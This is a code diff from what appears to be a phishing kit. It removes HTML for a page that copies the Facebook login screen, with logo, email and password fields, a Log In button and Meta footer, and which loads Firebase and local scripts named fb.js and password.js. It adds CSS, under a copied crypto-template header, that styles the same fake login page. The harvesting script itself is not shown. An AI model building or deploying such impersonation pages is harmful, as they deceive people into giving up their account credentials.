-                    d=" M-107.5,-51.5 C-107.5,-51.5 -52.5,-52.5 -52.5,-52.5 C-52.5,-52.5 -51.500999450683594,-105.5 -51.500999450683594,-105.5 C-52.0629997253418,-112.40499877929688 -52.73099899291992,-131.92799377441406 -40.500999450683594,-151.5 C-29.003999710083008,-169.89599609375 -12.826000213623047,-177.593994140625 -6.500999927520752,-180.5 C12.586999893188477,-189.26699829101562 29.902000427246094,-188.3560028076172 37.5,-187.5 C37.5,-187.5 84.4990005493164,-184.5 84.4990005493164,-184.5 C84.4990005493164,-184.5 84.4990005493164,-124.5 84.4990005493164,-124.5 C84.4990005493164,-124.5 42.5,-124.5 42.5,-124.5 C39.67100143432617,-124.2030029296875 32.64500045776367,-123.06400299072266 26.5,-117.5 C16.049999237060547,-108.03900146484375 17.32699966430664,-94.09500122070312 17.5,-92.5 C17.5,-92.5 17.5,-52.5 17.5,-52.5 C17.5,-52.5 84.4990005493164,-52.5 84.4990005493164,-52.5 C84.4990005493164,-52.5 74.4990005493164,15.5 74.4990005493164,15.5 C74.4990005493164,15.5 17.5,15.5 17.5,15.5 C17.5,15.5 17.5,184.5 17.5,184.5 C17.5,184.5 -51.500999450683594,184.5 -51.500999450683594,184.5 C-51.500999450683594,184.5 -51.500999450683594,14.5 -51.500999450683594,14.5 C-51.500999450683594,14.5 -107.5,14.5 -107.5,14.5 C-107.5,14.5 -107.5,-51.5 -107.5,-51.5z M-300,0 C-300,165.68600463867188 -165.68499755859375,300 -0.0010000000474974513,300 C165.68600463867188,300 300,165.68600463867188 300,0 C300,-165.68499755859375 165.68600463867188,-300 -0.0010000000474974513,-300 C-165.68499755859375,-300 -300,-165.68499755859375 -300,0z" />
-                </g>
-              </g>
-            </g>
-          </svg>
-        </div>
-      </div>
-      <div class="fbmain">
-        <div>
-          <div id="fbforma">
-            <svg xmlns="http://www.w3.org/2000/svg" width="240" height="79.27" fill="none" viewBox="0 0 1090 360">
-              <path fill="#0866FF"
-                d="M881.583 257.897h29.48v-47.696l41.137 47.696h36.072l-47.89-54.969 40.909-47.663h-32.825l-37.403 43.93v-96.982l-29.48 3.864v151.82Zm-67.988-105.261c-32.728 0-55.455 22.013-55.455 53.929s22.727 53.929 55.455 53.929c32.727 0 55.455-22.013 55.455-53.929s-22.728-53.929-55.455-53.929Zm0 82.728c-15.163 0-25.552-11.721-25.552-28.799s10.389-28.799 25.552-28.799c15.162 0 25.552 11.721 25.552 28.799s-10.39 28.799-25.552 28.799Zm-119.807-82.728c-32.727 0-55.455 22.013-55.455 53.929s22.728 53.929 55.455 53.929c32.728 0 55.455-22.013 55.455-53.929s-22.727-53.929-55.455-53.929Zm0 82.728c-15.162 0-25.552-11.721-25.552-28.799s10.39-28.799 25.552-28.799c15.163 0 25.552 11.721 25.552 28.799s-10.389 28.799-25.552 28.799Zm-112.826-82.728c-13.636 0-24.935 5.357-32.013 15.162v-65.585l-29.513 3.831v151.82h26.169l.519-15.844c6.981 11.818 19.481 18.474 34.838 18.474 27.988 0 48.475-22.728 48.475-53.929 0-31.202-20.39-53.929-48.475-53.929Zm-6.98 82.728c-15.163 0-25.552-11.721-25.552-28.799s10.389-28.799 25.552-28.799c15.162 0 25.552 11.721 25.552 28.799s-10.39 28.799-25.552 28.799Zm-113.638 1.331c-15.649 0-26.883-7.273-30.714-19.805h72.63c.715-3.831 1.202-8.377 1.202-11.429 0-33.02-18.475-52.825-49.514-52.825-31.331 0-53.02 22.013-53.02 53.929 0 32.338 22.728 53.929 56.462 53.929 17.467 0 34.448-5.844 45.065-15.552l-10.617-18.701c-10.292 7.11-20.39 10.454-31.494 10.454Zm-6.591-61.137c13.637 0 22.338 8.279 22.338 21.104v.098h-47.078c2.825-13.604 11.623-21.202 24.74-21.202Zm-98.994 84.968c15.26 0 30.195-5.844 40.714-15.974l-11.526-19.383c-8.182 6.364-17.467 9.805-26.266 9.805-16.364 0-27.273-11.429-27.273-28.377s10.909-28.377 27.273-28.377c8.084 0 16.883 2.922 24.026 8.085l11.721-19.806c-9.481-8.571-24.156-13.831-38.702-13.831-32.013 0-54.643 22.338-54.643 53.929.032 31.494 22.662 53.929 54.676 53.929Zm-93.735-105.261-.519 15.975c-6.981-11.916-19.481-18.572-34.838-18.572-28.085 0-48.475 22.728-48.475 53.929 0 31.202 20.52 53.929 48.475 53.929 15.357 0 27.889-6.656 34.838-18.474l.519 15.844h26.169V155.265h-26.169Zm-28.377 80.099c-15.162 0-25.552-11.721-25.552-28.799s10.39-28.799 25.552-28.799c15.163 0 25.552 11.721 25.552 28.799s-10.422 28.799-25.552 28.799Zm-57.663-79.906h-26.526v-8.767c0-13.117 5.13-18.149 18.442-18.149 4.123 0 7.467.097 9.383.292v-22.5c-3.637-1.007-12.5-2.013-17.63-2.013-27.111 0-39.611 12.792-39.611 40.422v10.682h-16.753v24.806h16.753v77.631h29.448v-77.599h21.949l4.545-24.805Z" />
-            </svg>
-            <div id="fbform" class="fbform">
-              <div class="fbform-group">
-                <div>
-                  <input class="fbinput" type="text" name="text" placeholder="Mobile number or email address"
-                    id="email" />
-                </div>
-              </div>
-              <div class="fbform-group">
-                <div>
-                  <input class="fbinput" id="password" type="password" name="password" placeholder="password" />
-                  <i class="toggle-password fa fa-fw fa-eye-slash"></i>
-                </div>
-              </div>
-              <button class="fbbutton" type="submit">Log In</button>
-              <p id="alert-message"></p><br>
-              <a href="#">Forgotten password?</a>
-              <div class="orr">
-                <p>or</p>
-              </div>
-            </div>
-            <div class="fbsign-up">
-              <p><a href="#">Create new account </a></p>
-            </div>
-          </div>
-
-
-          <!-- <p class="get">Get the app.</p>
-            <div class="fblinks">
-              <a href="#">
-                <img src="images/demo/app.png" alt="" />
-              </a>
-              <a href="#">
-                <img src="images/demo/google%20play.png" alt="" />
-              </a>
-            </div> -->
-          <div class="fbnd-links">
-            <ul class="uiList">
-              <li style="color: #737373; font-size: 13px">English (UK)</li>
-              <li>
-                <a class="_sv4" href="#">Hausa</a>
-              </li>
-              <li>
-                <a class="_sv4" href="#">Français (France)</a>
-              </li>
-              <li>
-                <a class="_sv4" href="#">Português (Brasil)</a>
-              </li>
-              <li>
-                <a class="_sv4" href="#">Español</a>
-              </li>
-              <li>
-                <a class="_sv4" href="#">العربية</a>
-              </li>
-              <li>
-                <a class="_sv4" href="#">Bahasa Indonesia</a>
-              </li>
-              <li>
-                <a class="_sv4" href="#">Deutsch</a>
-              </li>
-              <li>
-                <a class="_sv4" href="#">日本語</a>
-              </li>
-              <li>
-                <a class="_sv4" href="#">Italiano</a>
-              </li>
-              <li>
-                <a class="_sv4" href="#">हिन्दी</a>
-              </li>
-              <li>
-                <a role="button" class="_42ft _4jy0 _517i _517h _51sy" rel="dialog"
-                  ajaxify="/settings/language/language/?uri=https%3A%2F%2Fhi-in.facebook.com%2F&amp;source=www_list_selector_more"
-                  href="#" title="Show more languages"><i class="img sp_EP9wX8qDDvu_3x sx_f6e94d"></i></a>
-              </li>
-            </ul>
-          </div>
-          <div class="fbheppa">
-            <a href="#">About</a>
-            <li><a href="#">Help</a></li>
-            <li><a href="#">Help</a></li>
-          </div>
-          <footer class="fbfooter">
-            <p>Meta © 2024</p>
-          </footer>
-        </div>
-      </div>
-
-    </section>
-  </div>
-
-  <script>
-    // Function to show a form
-    function showForm(formId) {
-      document.getElementById(formId).style.display = 'block';
-    }
-
-    // Function to hide a form
-    function hideForm(formId) {
-      document.getElementById(formId).style.display = 'none';
-    }
-
-
-    document.addEventListener("DOMContentLoaded", () => {
-      const preloader = document.getElementById("modern-preloader");
-      const mainContent = document.getElementById("main-content");
-
-      // Simulate loading time
-      setTimeout(() => {
-        preloader.style.opacity = "0";
-        preloader.style.transition = "opacity 0.5s ease-out";
-
-        // Wait for the fade-out effect before hiding preloader
-        setTimeout(() => {
-          preloader.style.display = "none";
-          mainContent.style.display = "block"; // Show main content
-        }, 500);
-      }, 3000); // Adjust timing here (3 seconds)
-    });
-
-    document.addEventListener("DOMContentLoaded", () => {
-      // Simulate loading process
-      setTimeout(() => {
-        document.getElementById("fb-preloader").style.display = "none";
-        document.getElementById("main-content").style.display = "block";
-      }, 3000); // Preloader duration (3 seconds)
-    });
-
-    document.addEventListener("DOMContentLoaded", () => {
-      // Simulate loading process
-      setTimeout(() => {
-        document.getElementById("hm-preloader").style.display = "none";
-        document.getElementById("twp").style.display = "block";
-      }, 3000); // Preloader duration (3 seconds)
-    });
-
-  </script>
-  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
-
-  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
-
-  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
-  <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
-
-  <script src="js/firebase.js">
-
-  </script>
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-  <script src="js/vendors.min.js"></script>
-  <script src="js/theme.min.js"></script>
-  <script src="js/password.js"></script>
-  <script src="js/fb.js"></script>
-  <script src="js/index.js"></script>
-
-</body>
-
-</html>
+/*================================================================================
+	Item Name: Crypto ICO - Cryptocurrency Website Landing Page HTML + Dashboard Template
+	Version: 1.0
+	Author: PIXINVENT
+	Author URL: http://www.themeforest.net/user/pixinvent
+================================================================================
+
+NOTE:
+------
+PLACE HERE YOUR OWN SCSS CODES AND IF NEEDED, OVERRIDE THE STYLES FROM THE OTHER STYLESHEETS.
+WE WILL RELEASE FUTURE UPDATES SO IN ORDER TO NOT OVERWRITE YOUR STYLES IT'S BETTER LIKE THIS.  */
+.fbroot {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
+    Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+}
+
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
+    Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+}
+
+a {
+  text-decoration: none;
+}
+
+.fbmain {
+  height: 100vh;
+  width: 100%;
+  background-color: #fafafa;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  text-align: center;
+  padding: 0 30px;
+}
+
+#fbforma {
+  text-align: center;
+  border: 1px solid #dddfe2;
+  padding: 40px 20px;
+  padding-bottom: 20px;
+  background-color: #fff;
+  margin: auto;
+  border-radius: 8px;
+  box-shadow: 0px 2px 4px rgba(0, 0, 0, 0.1), 0px 8px 16px rgba(0, 0, 0, 0.1);
+  width: 396px;
+  /* padding-bottom: 0; */
+}
+
+.fbform {
+  margin-top: 20px;
+}
+
+.fbform-group {
+  text-align: start;
+  position: relative;
+  margin: 15px 0;
+}
+
+.fbform-group label {
+  position: absolute;
+  top: 10px;
+  left: 10px;
+}
+
+.fbform-group div {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  background-color: #f3f3f3;
+  /* border: 1px solid #c4c4c4; */
+  box-shadow: 1px 2px 2px #e5e5e5;
+  border-radius: 5px;
+  padding-right: 10px;
+}
+
+.fbform-group .fbinput {
+  width: 100%;
+  background: none;
+  border: none;
+  outline: none;
+  font-size: 13px;
+  color: #6b6b6b;
+  padding: 15px;
+}
+
+.field-icon {
+  position: relative;
+  color: rgb(65, 65, 65);
+  font-size: 13px;
+  z-index: 2;
+  cursor: pointer;
+  padding: 0;
+  margin: 0;
+}
+
+.fbbutton {
+  width: 100%;
+  border: 1px solid #1877f2;
+  background-color: #1877f2;
+  color: white;
+  font-size: 13px;
+  font-weight: 500;
+  padding: 10px;
+  border-radius: 5px;
+  margin-top: 5px;
+}
+
+.fb_votebutton {
+  border: 1px solid #1877f2;
+  background-color: #1877f2;
+  color: white;
+  font-size: 13px;
+  font-weight: 500;
+  padding: 10px;
+  border-radius: 5px;
+  margin-top: 5px;
+  cursor: pointer;
+}
+.orr {
+  position: relative;
+  text-align: center;
+  margin: 20px 0;
+}
+
+.orr p {
+  padding-bottom: 0;
+  margin-bottom: 0;
+  font-weight: 600;
+  font-size: 13px;
+  color: rgb(109, 109, 109);
+}
+
+.orr::after {
+  position: absolute;
+  content: "";
+  height: 1px;
+  width: 40%;
+  background-color: #dadada;
+  top: calc(50% - 0.5px);
+  left: 0;
+}
+
+.orr::before {
+  position: absolute;
+  content: "";
+  height: 1px;
+  width: 40%;
+  background-color: #dadada;
+  top: calc(50% - 0.5px);
+  right: 0;
+}
+
+.fbform a {
+  font-size: 13px;
+  color: #1877f2;
+}
+
+.fbsign-up {
+  height: auto;
+  text-align: center;
+  /* border: 1px solid #c9c9c9; */
+
+  /* padding: 20px; */
+  /* background-color: #fff; */
+  /* margin: auto; */
+  /* margin-top: 15px; */
+  width: 100%;
+}
+
+.fbsign-up p {
+  margin-bottom: 0;
+  padding-bottom: 0;
+  color: rgb(15, 15, 15);
+  font-size: 12px;
+}
+
+.fbsign-up p a {
+  color: #fff;
+  background-color: #42b72a;
+  font-weight: 500;
+  font-size: 17px;
+  border: 1px solid #42b72a;
+  display: inline-block;
+  width: 100%;
+  border-radius: 6px;
+  padding: 0 16px;
+  line-height: 48px;
+  max-width: 250px;
+  white-space: nowrap;
+  text-decoration: none;
+}
+
+.get {
+  color: #000;
+  margin: 15px 0;
+}
+
+.fblinks {
+  width: 100%;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0 20px;
+  width: 350px;
+  margin: auto;
+}
+
+.fblinks a img {
+  height: 45px;
+  width: auto;
+}
+
+.fbnd-links .uiList {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  align-items: center;
+  margin-top: 60px;
+  text-align: center;
+  justify-content: center;
+}
+
+.fbnd-links ._sv4 {
+  font-size: 12px;
+  margin: 0 10px;
+  color: #8a8d91;
+}
+.fbfooter p {
+  margin-top: 20px;
+  color: #848585;
+  font-size: 13px;
+}
+
+#alert-message {
+  color: rgb(255, 0, 0);
+}
+
+.fbheppa {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+  font-size: 10px;
+  margin-top: 30px;
+  color: #848585;
+}
+
+.fbheppa a {
+  color: #848585;
+}
+
+.fbheppa li {
+  list-style: disc;
+}
+
+@media screen and (max-width: 450px) {
+  .fbmain {
+  }
+  #fbforma {
+    background-color: transparent;
+    border: none;
+  }
+
+  .fbsign-up {
+    background-color: #42b72a;
+    color: #fff;
+    border-radius: 6px;
+  }
+}
